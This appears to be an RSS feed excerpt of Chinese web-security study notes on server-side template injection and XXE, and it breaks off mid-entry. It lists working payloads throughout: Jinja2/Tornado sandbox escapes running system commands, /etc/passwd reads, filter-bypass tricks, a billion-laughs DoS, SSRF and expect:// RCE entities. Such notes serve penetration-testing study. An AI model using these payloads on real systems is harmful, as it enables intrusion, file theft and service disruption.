            <title>模板注入</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link>
            <category>注入</category>
            <category>绕过</category>
            <pubDate>Sun, 27 Nov 2022 09:51:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。&lt;/p&gt;
&lt;h1 id=&#34;测试方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试方法&#34;&gt;#&lt;/a&gt; 测试方法&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;确定使用的引擎&lt;/li&gt;
&lt;li&gt;查看引擎相关的文档，确定其安全机制以及自带的函数和变量&lt;/li&gt;
&lt;li&gt;需找攻击面，尝试攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;测试用例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试用例&#34;&gt;#&lt;/a&gt; 测试用例&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;简单的数学表达式， &lt;code&gt;&amp;#123;&amp;#123; 7+7 &amp;#125;&amp;#125; =&amp;gt; 14&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串表达式  &lt;code&gt;&amp;#123;&amp;#123; &#34;ajin&#34; &amp;#125;&amp;#125; =&amp;gt; ajin&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ruby&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;%= 7 * 7 %&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;%= File.open(&#39;/etc/passwd&#39;).read %&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$&amp;#123;7*7&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Twig&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Smarty&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;php&amp;#125;echo `id`;&amp;#123;/php&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AngularJS&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$eval(&#39;1+1&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Tornado&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;引用模块  &lt;code&gt;&amp;#123;% import module %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;=&amp;gt;  &lt;code&gt;&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123; os.popen(&#34;whoami&#34;).read() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Flask/Jinja2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; config &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; config.items() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; url_for.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).system(&#39;ls&#39;) &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;).read() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Django&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; request &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% debug %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% load module %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% include &#34;x.html&#34; %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;% extends &#34;x.html&#34; %&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;目标&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标&#34;&gt;#&lt;/a&gt; 目标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;创建对象&lt;/li&gt;
&lt;li&gt;文件读写&lt;/li&gt;
&lt;li&gt;远程文件包含&lt;/li&gt;
&lt;li&gt;信息泄漏&lt;/li&gt;
&lt;li&gt;提权&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;相关属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关属性&#34;&gt;#&lt;/a&gt; 相关属性&lt;/h1&gt;
&lt;h2 id=&#34;__class__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__class__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__class__&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;python 中的新式类（即显示继承 object 对象的类）都有一个属性  &lt;code&gt;__class__&lt;/code&gt;  用于获取当前实例对应的类，例如  &lt;code&gt;&amp;quot;&amp;quot;.__class__&lt;/code&gt;  就可以获取到字符串实例对应的类&lt;/p&gt;
&lt;h2 id=&#34;__mro__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__mro__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__mro__&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;python 中类对象的  &lt;code&gt;__mro__&lt;/code&gt;  属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order） 寻找的顺序。&lt;/p&gt;
&lt;h2 id=&#34;__globals__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__globals__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__globals__&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;保存了函数所有的所有全局变量，在利用中，可以使用  &lt;code&gt;__init__&lt;/code&gt;  获取对象的函数，并通过  &lt;code&gt;__globals__&lt;/code&gt;  获取  &lt;code&gt;file&lt;/code&gt;   &lt;code&gt;os&lt;/code&gt;  等模块以进行下一步的利用&lt;/p&gt;
&lt;h2 id=&#34;__subclasses__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__subclasses__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__subclasses__()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;python 的新式类都保留了它所有的子类的引用， &lt;code&gt;__subclasses__()&lt;/code&gt;  这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。&lt;/p&gt;
&lt;p&gt;因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的  &lt;code&gt;__subclasses__()&lt;/code&gt;  方法就可以获取想要的类的对象。&lt;/p&gt;
&lt;h1 id=&#34;常见payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;().__class__.__bases__[0].__subclasses__()[40](r&#39;/etc/passwd&#39;).read()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;ls /&amp;quot;).read()&#39; )&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h1&gt;
&lt;h2 id=&#34;字符串拼接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字符串拼接&#34;&gt;#&lt;/a&gt; 字符串拼接&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;使用参数绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用参数绕过&#34;&gt;#&lt;/a&gt; 使用参数绕过&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;params = &amp;#123;
    &#39;clas&#39;: &#39;__class__&#39;,
    &#39;mr&#39;: &#39;__mro__&#39;,
    &#39;subc&#39;: &#39;__subclasses__&#39;
&amp;#125;
data = &amp;#123;
    &amp;quot;data&amp;quot;: &amp;quot;&amp;#123;&amp;#123;&#39;&#39;[request.args.clas][request.args.mr][1][request.args.subc]()&amp;#125;&amp;#125;&amp;quot;
&amp;#125;
r = requests.post(url, params=params, data=data)
print(r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==&#34;&gt;服务端模版注入&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cua25vd25zZWMuY29tLzIwMTYvMDIvdXNlLXB5dGhvbi1mZWF0dXJlcy10by1leGVjdXRlLWFyYml0cmFyeS1jb2Rlcy1pbi1qaW5qYTItdGVtcGxhdGVzLw==&#34;&gt;用 Python 特性任意代码执行&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/</guid>
            <title>XXE</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>XXE</category>
            <category>XML</category>
            <pubDate>Sun, 27 Nov 2022 09:31:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xml基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xml基础&#34;&gt;#&lt;/a&gt; XML 基础&lt;/h1&gt;
&lt;p&gt;XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。&lt;/p&gt;
&lt;h1 id=&#34;基本语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本语法&#34;&gt;#&lt;/a&gt; 基本语法&lt;/h1&gt;
&lt;p&gt;XML 文档在开头有  &lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;&lt;/code&gt;  的结构，这种结构被称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。&lt;/p&gt;
&lt;p&gt;除了可选的开头外，XML 语法主要有以下的特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有 XML 元素都须有关闭标签&lt;/li&gt;
&lt;li&gt;XML 标签对大小写敏感&lt;/li&gt;
&lt;li&gt;XML 必须正确地嵌套&lt;/li&gt;
&lt;li&gt;XML 文档必须有根元素&lt;/li&gt;
&lt;li&gt;XML 的属性值需要加引号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。&lt;/p&gt;
&lt;h1 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h1&gt;
&lt;p&gt;当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。&lt;/p&gt;
&lt;h1 id=&#34;攻击方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击方式&#34;&gt;#&lt;/a&gt; 攻击方式&lt;/h1&gt;
&lt;h2 id=&#34;拒绝服务攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拒绝服务攻击&#34;&gt;#&lt;/a&gt; 拒绝服务攻击&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a0&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;dos&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a1&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a2&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;a2;&#34;&gt;&amp;amp;a2;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。&lt;/p&gt;
&lt;h2 id=&#34;文件读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件读取&#34;&gt;#&lt;/a&gt; 文件读取&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;file;&#34;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://publicServer.com/&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;4&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;GVI&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt; &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;foo&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;ANY&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;!ENTITY xxe SYSTEM &#34;expect://id&#34; &gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;catalog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;core&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;test101&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token 